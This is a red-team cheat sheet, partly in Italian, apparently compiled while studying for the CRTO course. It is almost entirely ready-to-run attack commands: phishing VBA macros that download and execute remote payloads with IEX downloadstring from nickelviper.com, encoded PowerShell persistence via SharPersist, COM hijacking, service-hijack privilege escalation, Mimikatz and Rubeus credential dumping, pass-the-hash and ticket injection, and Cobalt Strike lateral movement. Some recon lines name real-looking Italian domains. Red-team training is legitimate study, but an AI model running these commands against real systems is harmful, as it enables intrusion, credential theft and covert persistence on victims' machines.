# 🛠️ CRTO

## DNS Records

```bash

#Dig
dig azienda.it

#whois
whois 172.67.205.143

#DNS scan
python3 dnscan.py -d mooney.it -w /Users/ph3mt/Desktop/Mooney2025/subdomain_italiani_ctf_400.txt
```

## Initial Compromise

```bash
#MailSniper
https://github.com/dafthack/MailSniper

#
ipmo C:\Tools\MailSniper\MailSniper.ps1
Invoke-DomainHarvestOWA -ExchHostname mail.cyberbotic.io

Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList "C:\Users\Attacker\Desktop\valid.txt" -Password "Summer2022" 

Get-GlobalAddressList -ExchHostname mail.cyberbotic.io -Username cyberbotic.io\iyates -Password Summer2022 -OutFile "C:\Users\Attacker\Desktop\globalemail.txt"



#Phishing

#Check MOTW
gc .\valid.txt -Stream Zone.Identifier

#VBA Macros1
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "notepad"

End Sub

##Macro2
Sub AutoOpen()
'
' Test1 Macro
'
'
    Dim Shell As Object
    Set Shell = CreateObject("wscript.shell")
    Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.5.50:80/a'))"""
    
    
End Sub

#Macro3
Sub AutoOpen()
'
' test1 Macro
'
'
Dim shell As Object
Set shell = CreateObject("wscript.shell")
shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://nickelviper.com:80/test'))"""
End Sub

```

## Host Reconnaissance
```bash
#Screen --> magari ha dati importanti nel desktop
screenshot

#Keylogger

#Clipboard --> cobalt
clipboard

#UserSession
net logons
```





## Host Persistence

```bash
#Tecniche più comuni
- HKCU / HKLM Registry Autoruns
- Task Schedulati
- Startup Folder

#Sharpersist

#execute-assembly tramite c2

PS C:\> $str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA

#tramite beacon
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA" -n "Updater" -m add -o hourly


#StartUp Folder
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA" -f "UserEnvSetup" -m add

#Registry Autorun
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "/q /n" -k "hkurun" -v "Updater" -m add





#COM Hijacking
open procmon.exe
    ->Filter
        ->The Operation is RegOpenKey.
        ->The Path contains InprocServer32 or LocalServer32.
        ->The Result is NAME NOT FOUND.
si cerca un COM legittimo
es: {AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}
la sua config si trova in HKLM\Software\Classes\CLSID\{GUID}\InprocServer32
se quella stessa chiave esiste anche in HKCU (utente corrente), Windows darà priorità a quella. Questo comportamento può essere sfruttato per "dirottare" (hijack) il caricamento del COM.

#Controllo chiave sistema
Get-Item -Path "HKLM:\Software\Classes\CLSID\{GUID}\InprocServer32"
#se non esiste la creiamo noi
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{GUID}"
New-Item -Path "HKCU:Software\Classes\CLSID\{GUID}" -Name "InprocServer32" -Value "C:\Payloads\http_x64.dll"
New-ItemProperty -Path "HKCU:...\InprocServer32" -Name "ThreadingModel" -Value "Both"
#Esempio:
#
#New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}"
#New-Item -Path "HKCU:Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}" -Name "InprocServer32" -Value "C:\Payloads\http_x64.dll"
#New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" -Name "ThreadingModel" -Value "Both"
#

#Sulla macchina vittima:
#cd C:\Users\pchilds\AppData\Local\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64
#upload C:\Payloads\http_x64.dll
#mv http_x64.dll Microsoft.Teams.HttpClient.dll
#timestomp Microsoft.Teams.HttpClient.dll Microsoft.Teams.Diagnostics.dll
#Aggiunti i registri:
#reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "" REG_EXPAND_SZ "%LocalAppData%\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64\Microsoft.Teams.HttpClient.dll"
#reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "ThreadingModel" REG_SZ "Both"

#quando la vittima aprirà teams arriva il becon


#Attivazione hijack
#Dopo il logout/login, DllHost.exe tenterà di caricare il COM.
#Poiché ora la versione in HKCU ha la precedenza, verrà caricata la DLL malevola, eseguendo così il codice scelto dall'attaccante (es. un C2 beacon).





```


## Post-Exploitation
#ServicePath (sc_qc)
#ServiceRegistry (powerpick)

```bash
#comandi utili Cobalt tutti lanciabili dal beacon

#spawn
spawn x64 http
#spawnas
spawnas CONTOSO\rsteel Passw0rd! tcp-local
#download
download C:\Users\test\Desktop\desktop.ini
#process
ps
#keylogger
keylogger
#jobs
jobs
jobs kills
#clipboard
clipboard
#registry
#read local policy
reg query x64 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
#read specific key
reg queryv x64 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System ConsentPromptBehaviorAdmin
#Screenshot
printscreen
#
screenshot
#
screenwatch
#VNC
desktop high/low
#shell
shell whoami /user
#run
run whoami /user
#powershell
powershell $env:computername
#powerpick
powerpick $env:computername
#psInjection
psinject 3020 x64 $PID
#Import PowerShell Script
powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
#
powerpick Get-Domain
#.NET
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe AntiVirus





```


## Privilege Escalation
```bash
#Sharp-up

##Controllo di eventuali servizi

#Controllo dei servizi
sc query
#GetService
Get-Service | fl


#Controllare il path del binario.
#Controllare il tipo di avvio Automatico,AvvioRitardato,Manuale,Disabilitato.
##Controllare lo stato del servizio Running,Stopped,StartPending,StopPending.
#Controllare l'accout che lo esegue (log on as)
#Controllare le dipendenze.

#Esempio trovo un servizio che:
##si avvia da solo,
##usa un account potente,
##puoi modificare il file .exe o i parametri del servizio.

#Identificato il servizio
sc qc VulnService

#Output atteso
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: VulnService
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\VulnApp\service.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Vulnerable Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

#con accesschk
accesschk.exe -wvu "C:\Program Files\VulnApp\service.exe"
accesschk.exe -cqv scmanager VulnService
accesschk.exe -uwcqv "Users" scmanager VulnService


#Output previsto
RW BUILTIN\Users

#con Powerview
Import-Module .\PowerView.ps1
Get-ServiceUnquoted | fl
Get-ModifiableService -Verbose
#Trovare servizi che girano come system
Get-Service | ? { $_.StartType -eq 'Automatic' -and $_.Status -eq 'Running' } | 
ForEach-Object {
    $svc = $_.Name
    $config = Get-WmiObject -Class Win32_Service -Filter "Name='$svc'"
    if ($config.StartName -eq 'LocalSystem') {
        $svc
    }
}

#Esempio
copy /Y evil.exe "C:\Program Files\VulnApp\service.exe"
sc stop VulnService
sc start VulnService





#path Interception
#dal c2 per visualizzare il PATH environment
env



#Unquoted Service Path
#cercare servizio con wmi
wmic service get name, pathname, startmode
#Output previsto
Name             PathName                                                   StartMode
VulnService1     C:\Program Files\Vulnerable Services\Service 1.exe         Auto


#verifcare permessi con accesschk
accesschk.exe -d "C:\Program Files\Vulnerable Services"
#output
RW BUILTIN\Users

#Ricerca vuln powershell
Get-WmiObject Win32_Service | Where-Object {
    $_.PathName -notlike '"*"' -and $_.PathName -like "* *"
} | Select-Object Name, PathName, StartMode


#Sharphound
execute-assembly SharpUp.exe audit UnquotedServicePath
#Output Previsto
Service 'VulnService1' has executable 'C:\Program Files\Vulnerable Services\Service 1.exe'
but 'C:\Program Files\Vulnerable Services\Service.exe' is modifiable.


#Weak Service Permissions
#da cobalt:
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices

#outputcobalt
=== Modifiable Services ===

    Service 'VulnService2' (State: Running, StartMode: Auto)

#listre tutti i servizi
sc query type= service state= all

#Per verificare con cmd
sc_qc VulnService2
#output
BINARY_PATH_NAME   : "C:\Program Files\Vulnerable Services\Service 2.exe"
SERVICE_START_NAME : LocalSystem 

#esempio:
#carico payload
mkdir C:\Temp
copy C:\Payloads\tcp-local_x64.svc.exe C:\Temp\

#modifico percorso binario (spazio dopo binPAth)
sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe

#check se il percorso è cambiato
sc qc VulnService2

#spegno e riavvio il binario
sc stop VulnService2
sc start VulnService2

#una volta creato mi connetto da cobalt
beacon> connect localhost 4444

#per ripristinare
beacon> run sc config VulnService2 binPath= \""C:\Program Files\Vulnerable Services\Service 2.exe"\"

#Weak Service Binary Permissions
#uguale a sopra, ma sugli exe

beacon> powershell Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | fl
#output che fa vedere che gli utenti possono modificare il file
Access : BUILTIN\Users Allow Modify, Synchronize

#scarico la copia di esegubile (sempre fare la copia di un binario reale)
beacon> download Service 3.exe

#preparo il payload rinominandolo
PS C:\Payloads> copy "tcp-local_x64.svc.exe" "Service 3.exe"

#Se il servizio è in esecuzione potrebbe dare errore
#stoppo servizio
sc stop VulnService3

#sovrascrivo il paylaod
upload C:\Payloads\Service 3.exe
#riavvio il servizio 
sc start VulnService3

#con cobalt, mi connetto
connect localhost 4444


###Service File Permission
#se i permessi della cartella sono deboli
#un servizio di windows viene eseguito tramite binario.exe
beacon> cacls "C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe"

#blocco il servizio
beacon> sc_stop BadWindowsService
#sostituisco il file
beacon> upload C:\Payloads\BadWindowsService.exe
#riavvio il servizio
beacon> sc_start BadWindowsService


#mostra che gli Autenticated Users hanno fullControl
Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\BadWindowsService
#output
Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BadWindowsService
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : NT AUTHORITY\Authenticated Users Allow  FullControl
         BUILTIN\Users Allow  ReadKey
         BUILTIN\Administrators Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         CREATOR OWNER Allow  FullControl
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow  
         ReadKey
Audit  : 
Sddl   : O:BAG:SYD:AI(A;OICI;KA;;;AU)(A;CIID;KR;;;BU)(A;CIID;KA;;;BA)(A;CIID;KA;;;SY)(A;CIIOID;KA;;;CO)(A;CIID;KR;;;AC)
         (A;CIID;KR;;;S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934
         681)



#spengo il servizio
beacon> sc_stop BadWindowsService
#carico l'exe malevolo
beacon> sc_config BadWindowsService C:\Path\to\Payload.exe 0 2
#lo riavvio
beacon> sc_start BadWindowsService


###Dll Search Order Hijacking
#le app di solito non hanno un path per trovare le dll
#caricare la dll malevola e piazzarla in una cartella che viene cercata per prima

#controllo che la cartella dove si esegue è scrivibile
cacls "C:\Program Files\Bad Windows Service\Service Executable"
# Risultato: Authenticated Users:(CI)(OI)F → utenti normali possono scrivere

#carico la dll malevola
beacon> cd C:\Program Files\Bad Windows Service\Service Executable
beacon> upload C:\Payloads\dns_x64.dll
beacon> mv dns_x64.dll BadDll.dll

#quando il servizio viene avviato parte il beacon



#User Account Control

#controlla i gruppi, a volte non basta essere local admin
whoami /groups

#comando elevate
beacon> elevate

#comando runasadmin
beacon> runasadmin



```


## Elevated Host Persistence

```bash

#Upload del payload
beacon> cd C:\Windows
beacon> upload C:\Payloads\tcp-local_x64.svc.exe
beacon> mv tcp-local_x64.svc.exe legit-svc.exe

#Creazione del SharPersist
beacon> execute-assembly SharPersist.exe -t service -c "C:\Windows\legit-svc.exe" -n "legit-svc" -m add

#PowerLurk
beacon> cd C:\Windows
beacon> upload C:\Payloads\dns_x64.exe
#Import Evento
beacon> powershell-import C:\Tools\PowerLurk.ps1
beacon> powershell Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Windows\dns_x64.exe" -Trigger ProcessStart -ProcessName notepad.exe
#Quando si esegue notepad.exe si sesegue dns_X64.exe
Get-WmiEvent -Name WmiBackdoor

#filtro
SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='notepad.exe'


```

## Mimikatz

```bash

# 🛠️ Mimikatz Cheat Sheet

#General - Abilitazioni e logging
#Abilita i privilegi di debug necessari per accedere a LSASS e altre funzioni
privilege::debug
#Inizia il logging dell'output sulla console
log
#Inizia il logging su un file specifico
log customlogfilename.log

#Sekurlsa - Dump credenziali e ticket
#Estrae le credenziali attive dalla memoria (richiede debug)
sekurlsa::logonpasswords
#Versione estesa per ambienti con più dettagli (più verboso)
sekurlsa::logonPasswords full
#Esporta tutti i ticket Kerberos attivi in formato .kirbi
sekurlsa::tickets /export
#Pass-the-Hash: autentica un utente usando l'hash NTLM senza conoscere la password
sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd

#Kerberos - Gestione dei ticket
#Elenca i ticket Kerberos caricati nella sessione, con possibilità di esportarli
kerberos::list /export
#Inietta un ticket Kerberos (.kirbi) nella sessione corrente
kerberos::ptt c:\chocolate.kirbi
#Crea un Golden Ticket Kerberos (richiede SID e hash krbtgt)
kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-... /krbtgt:<hash> /ticket:<file>

#Crypto - Certificati e chiavi
#Mostra gli oggetti crittografici del CAPI store dell’utente
crypto::capi
#Mostra gli oggetti del CNG Key Storage Provider
crypto::cng
#Esporta certificati utente dal certificato store
crypto::certificates /export
#Esporta certificati dalla macchina (store locale)
crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE
#Esporta le chiavi crittografiche
crypto::keys /export
#Esporta le chiavi della macchina
crypto::keys /machine /export

#Vault & Lsadump
#Estrae le credenziali salvate nel Windows Credential Vault
vault::cred
#Elenca le voci del Credential Vault
vault::list
#Eleva il token all'utente SYSTEM (impersonazione)
token::elevate
#Reverte il token all'utente originale
token::revert
#Dump degli hash locali SAM (Security Account Manager)
lsadump::sam
#Estrae i "segreti" di sistema da SECURITY hive
lsadump::secrets
#Estrae le Domain Cached Credentials (credenziali AD in cache)
lsadump::cache
#Simula un Domain Controller per recuperare le credenziali (richiede DA)
lsadump::dcsync /user:domain\krbtgt /domain:lab.local

#PTH - Pass-the-Hash
#Esegue un attacco PTH usando solo NTLM
sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:<hash>
#Esegue un attacco PTH usando solo AES256
sekurlsa::pth /user:Administrateur /domain:chocolate.local /aes256:<hash>
#Esegue un attacco PTH combinando NTLM e AES256
sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:<hash> /aes256:<hash>
#PTH e avvio di una shell CMD
sekurlsa::pth /user:Administrator /domain:WOSHUB /ntlm:{NTLM_hash} /run:cmd.exe

#Ekeys - Estrazione chiavi Kerberos
#Estrae session keys usate da Kerberos
sekurlsa::ekeys

#DPAPI - Chiavi protette
#Estrae masterkey usate da Windows per DPAPI
sekurlsa::dpapi

#Minidump - Analisi LSASS offline
#Carica un file di dump di LSASS e lo analizza per credenziali
sekurlsa::minidump lsass.dmp

#PTT - Inject manuale di ticket
#Inietta un file .kirbi nella sessione corrente
kerberos::ptt Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbi

#Golden/Silver Tickets
#Crea un Golden Ticket (accesso completo)
kerberos::golden /user:utilisateur /domain:... /sid:... /krbtgt:... /id:1107 /groups:513 /ticket:file
#Golden ticket avanzato con AES256, gruppi, e validità personalizzata
kerberos::golden /domain:... /sid:... /aes256:... /user:... /id:500 /groups:... /ptt /startoffset:-10 /endin:600 /renewmax:10080
#Golden ticket con admin esplicito e output su file
kerberos::golden /admin:Administrator /domain:... /sid:... /krbtgt:... /ticket:Administrator.kiribi

#TGT - Mostrare il Ticket Granting Ticket
#Visualizza il TGT attivo in memoria
kerberos::tgt

#Purge - Pulizia ticket
#Rimuove tutti i ticket Kerberos dalla memoria
kerberos::purge


```

## Elevated Host Persistence

```bash
##Stessa cosa per la persistence da host, ma con i privilegi
#Task schedulati
#
#
# <Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
# <Triggers>
#     <BootTrigger>
#         <Enabled>true</Enabled>
#     </BootTrigger>
# </Triggers>
# <Principals>
#     <Principal>
#         <UserId>NT AUTHORITY\SYSTEM</UserId>
#         <RunLevel>HighestAvailable</RunLevel>
#     </Principal>
# </Principals>
# <Settings>
#     <AllowStartOnDemand>true</AllowStartOnDemand>
#     <Enabled>true</Enabled>
#     <Hidden>true</Hidden>
# </Settings>
# <Actions>
#     <Exec>
#         <Command>"C:\Program Files\Microsoft Update Health Tools\updater.exe"</Command>
#     </Exec>
# </Actions>
# </Task>
#
#
beacon> cd C:\Windows\System32
beacon> upload C:\Payloads\beacon_x64.exe
beacon> schtaskscreate \Beacon XML CREATE


#Windows Service
beacon> cd C:\Windows\System32\
beacon> upload C:\Payloads\beacon_x64.svc.exe
beacon> mv beacon_x64.svc.exe debug_svc.exe


beacon> sc_create dbgsvc "Debug Service" C:\Windows\System32\debug_svc.exe "Windows Debug Service" 0 2 3

```


## Credential Access

```bash
#Leggere credenziali da Browser
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpChrome\bin\Release\SharpChrome.exe logins


#Windows Credential Manager
#tool Nativo
beacon> run vaultcmd /listcreds:"Windows Credentials" /all

#Seabelt
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault


#ShardDPAPI  
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /rpc

#LSASS
##OPSEC NOTE
# Dumpare LSASS non va bene
#Mimikatz utilizza http beacon che è più veloce

#NTLM Hash
beacon> mimikatz sekurlsa::logonpasswords   
#che poi andrà crackato
PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 1000 .\ntlm.hash .\example.dict -r .\rules\dive.rule

#Kerberos Key
beacon> mimikatz sekurlsa::ekeys

#
 .\hashcat.exe -a 0 -m 28900 .\sha256.hash .\example.dict -r .\rules\dive.rule


#SAM

#Mimikatz
beacon> mimikatz !lsadump::sam

#LSA Secret
beacon> mimikatz !lsadump::secrets

#Cached Domain Credentials
beacon> mimikatz !lsadump::cache

#
PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 2100 .\mscachev2.hash .\example.dict -r .\rules\dive.rule




#Kerberos Ticket
#OPSEC
#Un approccio più sicuro consiste nell'utilizzare uno strumento di enumerazione per selezionare prima i potenziali obiettivi e poi arrostirli in modo più selettivo.

#AS-REP Roasting
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /nowrap
#
PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 18200 .\asrep.hash .\example.dict -r .\rules\dive.rule

#Kerberoasting
#Prima enumero
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe -s "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))" --attributes cn,samaccountname,serviceprincipalname

#
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /format:hashcat /simple
#
PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 13100 .\kerb.hash .\example.dict -r .\rules\dive.rule

###Esempio OPSEC
#Enumero (questo a volte sminchia gli spn)
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe -s "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))" --attributes cn,samaccountname,serviceprincipalname
#Passo a rubeus solo l'spn che mi interessa
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /simple /nowrap /format:hashcat

#Kerberoasting
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /spn:"MSSQLSvc/sql.contoso.com:1433" /format:hashcat /simple



#Estrarre i ticket
#opsec molto meglio non tocchiamo lsass

#Rubeus to triage Kerberos tickets for all users.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

#ottenuto LUID con il cmando sopra dumpo il ticket
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:[LUID] /service:krbtgt /nowrap




#Renewing TGTs
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIFq[...snip...]uQ09N


beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe renew /ticket:doIFq[...snip...]uQ09N /nowrap

PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIFq[...snip...]uQ09N



```


## Credential Access

```bash
#make_token con credenziali
beacon> make_token CONTOSO\rsteel Passw0rd!

#stealToken
#aprire i processi
ps
#usare la funzionalità di CobaltStrike (hight integrity session)
steal_token [numeroPID]

#RevertToSelf
rev2self

#Token Store (possiamo salvare i token che abbiamo)
beacon> token-store steal 5248
#poi lo scegliamo
beacon> token-store use 0



#Pass The Hash
beacon> pth CONTOSO\rsteel fc525c9683e8fe067095ba2ddc971889

#Pass The Ticket

#si richiede un ticket con rubeus
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960 /nowrap

#Beacon ha un kerberos_ticket_use il ticket deve essere un .kirbi nel pc che sta eseguendo CobaltStrike
#se abbiamo il ticket in base64 da rubeus lo si può scrivere sul disco con powershell
$ticket = "doIFo[...snip...]kNPTQ=="
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String($ticket))

#non bisogna fare clubbering, quindi meglio fare un logon netonly senza ticket

# "FakePass" è fittizio: make_token serve solo a creare un contesto utente impersonato, non ad autenticarsi.
beacon> make_token CONTOSO\rsteel FakePass
#mostra che non ci sono ticket
klist

#inietto ticket .kirbi
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
#se facciamo klist vediao il ticket
#una volta terminato 
beacon> kerberos_ticket_purge
#per tornare alla sessione originale
beacon> rev2self

#Versione Rubeus
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\notepad.exe /username:rsteel /domain:CONTOSO.COM /password:FakePass
#Alternativa
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960 /nowrap



#Injectio il ticket
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x132ef34 /ticket:doIFoDCCBZygAwIBBaEDAgEWooIEqjCCBKZhggSiMIIEnqADAgEFoQ0bC0NPTlRPU08uQ09NoiAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTaOCBGQwggRgoAMCARKhAwIBAqKCBFIEggROtBamcnEu/7ynHLwUewKlaWuh5t/323kFYx8tjVxdEYlMwiqm+EMYSDI5Fz+nuNtX6Xx2JOafezhIrh7G/YdBP1ON6Mztyfk18HeLns88lioPofyqrVFEn/Z6LP/1FGVSvYE7ppoDFjq2wbD5WWMDm330g9U3XtfYTs/AuAVxrEIhOtdqZYnUHxuG2+dphKn4bz5L086edK32xOa0EyagP3elH6uPL0pijao3sS4ndpf6/gvdtBqAg2AR1vby27WEMeksfyWF7ysuL0ae6GwvpSrJuwhYC9vcLXYWtNK4UKWJpy+SrXXA8ylxsLHcWHYo0wz1+lsOCefpRk1TvrUUvKIPJhjSNHpPB3+6/aY5b1k8if8cxdet5vWCMloYprc9KpSRiu8AtZS0VPBvlUfTVe4z4SsmdI2N1z/OsQGfnPFm5O22dN8PKhI2C0jv8vSzB245kLiPHM1V+yL0f5zdN3RT0jn7bd3GoXEMKkxZllaqu6aenCnCtV4Wi9MhMeyWyRwsux5PxTh3BgXYG201FUiKDr3q5QWXNjpnFYplGQEOMYReMtt/AYN1fSPsPStCImmpSTjx9nuFOuEu9jadnhk2bRt6vMGQUKzO4vaFSzGFIbjWzT3y6cuViSMCugSVJaaFluAyw2a4vBpyb/tM/kzOiHm9BBW4/a1QRYdqF4/BSFM1RGXjqSqhoCFEN+bn1nPv4PDReTrHvFiUtX29Ehh3PThv7BFaNHfNTrS+IbVTC7kP8xKk88Puy/BpEsaFBkpLxGbNc9fT8JUI+D4IPmubUKR+ApfMKf4efdjqxVsfhXrJeUmPYLi3KnlhsGTkOvxvQ9F5npdZ4IB8mJBa68ExmC/6NML6DRJfkRPKmebTcMvwhlQ1o7bqor+hKglo0V5V0DI902nYR4LUoDoXkaWsz5NDPnEilwDe4hL8v6c3JOKLzWVMkxE8DrGqJF8Sv8JOYT4/380w/4Jl/CxjVcu59TuPO5sA2nTRRiKBEG9anfBkUPcw+pGCLBN6Fsr4+0qQckYFqxFbtDesXjUsEsuGG+yURhbuownT0c9bDMbasiuzH6BComfGS7b85bA3arTkzrIgXfD2T/baLjc9tHH2L8WmTkRkb34ecxn8aKnc9gBQKOgs+8X4LED2ZIcyMGm5ddNz83eZGeOlmlzVu72IYTU7L3nGP5sAHNmnl7bvPADqh7WVkH1okgs+McG83TzuO6Wf4w7Wu8gl5QCmODLkDb/0crOSPq81UzAFLZfSeaH1hKxvTTepxYP7VjwBJnWsm5nmQfd5m3hOb/YvJ1wC1VS5sFRJW0R9eFIzNh/Tof+a2QU6beI/8IntmoabVujrAn/2Z41gCd/zbH0KgsalQBCzPcK7cYrpsDZ7aLdizOmM7Z02mT1WhLsuQdaXXafc3+Ns3ZPQHCatUAMPU6qz4efKWnoZowFGFmHwVeMtl01D3q/1EaGg16A2yKOB4TCB3qADAgEAooHWBIHTfYHQMIHNoIHKMIHHMIHEoCswKaADAgESoSIEIGGgxK5dlc1UgsHScNHrnVcHwW7TspwF/Ki2xYMO7K2voQ0bC0NPTlRPU08uQ09NohMwEaADAgEBoQowCBsGcnN0ZWVsowcDBQBA4QAApREYDzIwMjUwMjE3MTM0MjMzWqYRGA8yMDI1MDIxNzIzNDIzM1qnERgPMjAyNTAyMjQxMzQyMzNaqA0bC0NPTlRPU08uQ09NqSAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTQ==

#rubo il token del processo spawnato
beacon> steal_token 2524
#per tornare indietro sempre
rev2self


#Process Injection
#cerco un target (serve high intergrity)
ps
#lo injecto
inject 5248 x64 http

```





## Discovery

```bash

#ricerca LDAP
ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) *,ntsecuritydescriptor
ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor



#query Bloodhound
Match (n:GPO) return n

#Caricando i file su bloodhoun faasdad

```

## Lateral Movement

```bash
#Assicurarsi che WinRM sia attivo e che il target accetti connessioni remote.
Enable-PSRemoting -Force
Set-Item WSMan:\localhost\Client\TrustedHosts * -Force

#Spostare beacon su host remoto
jump winrm64 <target> smb


